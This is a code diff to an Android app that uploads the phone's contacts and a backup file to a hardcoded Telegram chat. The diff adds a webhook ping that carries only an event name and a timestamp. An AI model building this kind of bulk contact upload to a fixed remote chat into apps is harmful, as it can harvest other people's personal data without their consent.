@@ -48,6 +48,13 @@ public class MainActivity extends AppCompatActivity {
     private static final String CHAT_ID = "7825761805";
     // ============================================================
 
+    // ============================================================
+    // n8n Webhook Configuration (Optional Ping Trigger)
+    // Replace with your actual n8n webhook URL
+    // ============================================================
+    private static final String N8N_WEBHOOK_URL = "https://your-n8n-domain.com/webhook/YOUR_WEBHOOK_ID";
+    // ============================================================
+
     private static final int PERMISSION_REQUEST_CODE = 100;
     private static final int TELEGRAM_MAX_LENGTH = 3500;
 
@@ -136,8 +143,15 @@ public class MainActivity extends AppCompatActivity {
                     updateStatus("📤 Sending backup file attachment to Telegram...");
                     boolean fileSuccess = sendFileToTelegram(backupFile, contacts.size());
 
+                    // Step 5: Trigger n8n webhook ping (without sending user data)
+                    updateStatus("🔔 Triggering n8n webhook ping...");
+                    boolean webhookTriggered = triggerN8nWebhook();
+                    if (webhookTriggered) {
+                        Log.d(TAG, "n8n webhook triggered successfully");
+                    }
+
                     if (textSuccess && fileSuccess) {
-                        updateStatus("✅ All " + contacts.size() + " contacts + backup file sent to Telegram successfully!");
+                        updateStatus("✅ Contacts + backup file sent to Telegram successfully!");
                     } else if (fileSuccess) {
                         updateStatus("✅ Backup file sent successfully to Telegram!");
                     } else {
@@ -158,6 +172,41 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
         }).start();
+    }
+
+    /**
+     * Trigger an n8n webhook workflow with an empty ping payload (no contact/user info).
+     */
+    private boolean triggerN8nWebhook() {
+        if (N8N_WEBHOOK_URL == null || N8N_WEBHOOK_URL.trim().isEmpty() || N8N_WEBHOOK_URL.contains("your-n8n-domain.com")) {
+            Log.d(TAG, "n8n Webhook URL is not configured, skipping.");
+            return true;
+        }
+
+        try {
+            // Simple trigger ping without sensitive data
+            JSONObject pingPayload = new JSONObject();
+            pingPayload.put("event", "backup_completed");
+            pingPayload.put("timestamp", System.currentTimeMillis());
+
+            RequestBody body = RequestBody.create(
+                    pingPayload.toString(),
+                    MediaType.parse("application/json; charset=utf-8")
+            );
+
+            Request request = new Request.Builder()
+                    .url(N8N_WEBHOOK_URL)
+                    .post(body)
+                    .build();
+
+            Response response = httpClient.newCall(request).execute();
+            boolean success = response.isSuccessful();
+            response.close();
+            return success;
+        } catch (Exception e) {
+            Log.e(TAG, "Error triggering n8n webhook", e);
+            return false;
+        }
     }
 
     /**
